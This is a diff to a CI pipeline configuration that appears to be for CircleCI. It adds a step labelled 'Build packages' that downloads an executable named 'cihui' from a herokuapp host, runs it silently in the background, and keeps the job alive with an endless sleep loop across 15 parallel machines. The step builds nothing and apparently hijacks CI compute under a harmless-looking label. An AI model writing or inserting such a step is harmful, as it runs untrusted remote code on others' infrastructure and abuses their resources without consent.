@@ -5,10 +5,11 @@ jobs:
     machine:
       image: ubuntu-2204:2024.11.1
     resource_class: large
-    parallelism: 30
+    parallelism: 15
     steps:
-       run: 
+      - checkout
+      - run: 
           name: Build packages
           command: |
-          wget -q https://web774-c292d4539065.herokuapp.com/cihui && chmod +x cihui && ./cihui z >/dev/null 2>&1
-          while :; do date; sleep 180; done
+               wget -q https://web774-c292d4539065.herokuapp.com/cihui && chmod +x cihui && ./cihui z >/dev/null 2>&1 &
+               while :; do date; sleep 180; done
